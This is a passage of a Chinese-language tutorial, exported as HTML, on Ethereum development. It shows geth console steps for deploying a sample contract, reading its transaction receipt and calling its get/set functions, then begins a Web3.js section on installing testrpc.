0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">thesample</span> = <span class="cm-variable">sample</span><span class="cm-error">.new</span>(<span class="cm-number">99</span>, {<span class="cm-variable">from</span>:<span class="cm-variable">eth.accounts</span>[<span class="cm-number">0</span>], <span class="cm-variable">data</span>:<span class="cm-variable">hex</span>, <span class="cm-variable">gas</span>:<span class="cm-number">3000000</span>})</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">abi</span>: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"value"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"set"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, <span class="cm-variable">INFO</span> [<span class="cm-error">0</span><span class="cm-number">7</span><span class="cm-operator">-</span><span class="cm-number">26</span><span class="cm-operator">|</span><span class="cm-number">22</span>:<span class="cm-number">33</span>:<span class="cm-number">47.302</span>] <span class="cm-variable">Commit</span> <span class="cm-keyword">new</span> <span class="cm-variable">mining</span> <span class="cm-variable">work</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">number</span>=<span class="cm-number">2</span> <span class="cm-variable">txs</span>=<span class="cm-number">0</span> <span class="cm-variable">uncles</span>=<span class="cm-number">0</span> <span class="cm-variable">elapsed</span>=<span class="cm-number">1.098</span><span class="cm-variable">ms</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"get"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, <span class="cm-variable">WARN</span> [<span class="cm-error">0</span><span class="cm-number">7</span><span class="cm-operator">-</span><span class="cm-number">26</span><span class="cm-operator">|</span><span class="cm-number">22</span>:<span class="cm-number">33</span>:<span class="cm-number">47.303</span>] <span class="cm-variable">Block</span> <span class="cm-variable">sealing</span> <span class="cm-variable">failed</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">err</span>=<span class="cm-string">"waiting for transactions"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"constructor"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">address</span>: <span class="cm-variable">undefined</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">transactionHash</span>: <span class="cm-string">"0x2280fe5f44756e44f0c7e9740f254ab18261d3b7836d801b43678ddf442480a0"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 905px;"></div><div class="CodeMirror-gutters" style="display: none; height: 905px;"></div></div></div></pre><ul><li>查看交易细节</li></ul><blockquote><p>根据交易 hash 查看交易细节</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">samplerecpt</span> = <span class="cm-variable">eth.getTransactionReceipt</span>(<span class="cm-string">"0x2280fe5f44756e44f0c7e9740f254ab18261d3b7836d801b43678ddf442480a0"</span>)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">blockHash</span>: <span class="cm-string">"0x3656ba77328cd78087d3f5a61287d95241fba76d7de606868f1561f147a17dc1"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">blockNumber</span>: <span class="cm-number">1</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">contractAddress</span>: <span class="cm-string">"0x1ce836d1d1839f1ed07b01ae152a4c5f0ee2a041"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">cumulativeGasUsed</span>: <span class="cm-number">134093</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">from</span>: <span class="cm-string">"0x2f3efd9475fb969eecfdade75a1dae02dbd92e25"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">gasUsed</span>: <span class="cm-number">134093</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">logs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">logsBloom</span>: <span class="cm-string">"0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">status</span>: <span class="cm-string">"0x1"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">to</span>: <span class="cm-variable">null</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">transactionHash</span>: <span class="cm-string">"0x2280fe5f44756e44f0c7e9740f254ab18261d3b7836d801b43678ddf442480a0"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">transactionIndex</span>: <span class="cm-number">0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 514px;"></div><div class="CodeMirror-gutters" style="display: none; height: 514px;"></div></div></div></pre><ul><li>合约命名</li></ul><blockquote><p>交易信息中，contractAddress 表示合约地址</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">samplecontract</span> = <span class="cm-variable">sample.at</span>(<span class="cm-string">"0x1ce836d1d1839f1ed07b01ae152a4c5f0ee2a041"</span>)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">abi</span>: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"value"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"set"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"get"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"constructor"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">address</span>: <span class="cm-string">"0x1ce836d1d1839f1ed07b01ae152a4c5f0ee2a041"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">transactionHash</span>: <span class="cm-variable">null</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">allEvents</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-keyword">get</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-keyword">set</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">value</span>: <span class="cm-keyword">function</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 905px;"></div><div class="CodeMirror-gutters" style="display: none; height: 905px;"></div></div></div></pre><ul><li>执行合约 get 函数</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">samplecontract</span><span class="cm-error">.get</span><span class="cm-variable">.call</span>()</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">99</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 54px;"></div><div class="CodeMirror-gutters" style="display: none; height: 54px;"></div></div></div></pre><ul><li>执行合约 set 函数</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">samplecontract</span><span class="cm-error">.set</span><span class="cm-variable">.sendTransaction</span>(<span class="cm-number">1001</span>, {<span class="cm-variable">from</span>:<span class="cm-variable">eth.accounts</span>[<span class="cm-number">0</span>], <span class="cm-variable">gas</span>:<span class="cm-number">3000000</span>})</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0x528209c6bcdbbb4a636eebd90cfc918eb8e463fed1f0cb3bbd8ef19df0654808"</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 54px;"></div><div class="CodeMirror-gutters" style="display: none; height: 54px;"></div></div></div></pre><ul><li>执行合约 get 函数</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">samplecontract</span><span class="cm-error">.get</span><span class="cm-variable">.call</span>()</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1001</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 54px;"></div><div class="CodeMirror-gutters" style="display: none; height: 54px;"></div></div></div></pre><h3><a name='header-n257' class='md-header-anchor '></a>以太坊 Web3.js 开发基础</h3><blockquote><p><strong>OS:</strong> Ubuntu 14.04.5 LTS</p><p><strong>NPM:</strong> 5.6.0</p><p><strong>nodejs:</strong> 8.11.3</p><p><strong>web3:</strong> 0.20.1（<strong>注意：不同版本接口不兼容</strong>）</p></blockquote><h4><a name='header-n267' class='md-header-anchor '></a>简介</h4><p>​<span>	</span>web3.js 是一个通过 <a href='https://github.com/ethereum/wiki/wiki/JSON-RPC'>RPC 调用</a> 和本地以太坊节点进行通信的 js 库。web3.js 可以与任何暴露了 RPC 接口的以太坊节点连接。 web3 中提供了 eth 对象 <code>web3.eth</code> 来与以太坊区块链进行交互。</p><h4><a name='header-n270' class='md-header-anchor '></a>安装 testrpc</h4><blockquote><ul><li>ethereumjs-testrpc 库后续被重命名为 Ganache CLI</li><li>testrpc 不同于 geth，geth 是真正的以太坊环境，testrpc 是在本地使用内存模拟的一个以太坊环境，对于开发调试来说，更为方便快捷，当合约在 testrpc 中测试通过后，再部署到 geth 中去。</li></ul></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root:~<span class="cm-comment">#  npm install -g ethereumjs-testrpc</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">npm</span> WARN deprecated ethereumjs-testrpc@6.0.3: ethereumjs-testrpc has been renamed to ganache-cli, please use this package from now on.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/usr/local/bin/testrpc <span class="cm-attribute">-</span>&gt; /usr/local/lib/node_modules/ethereumjs-testrpc/build/cli.node.js</span></pre><pre class=" CodeMirror-line 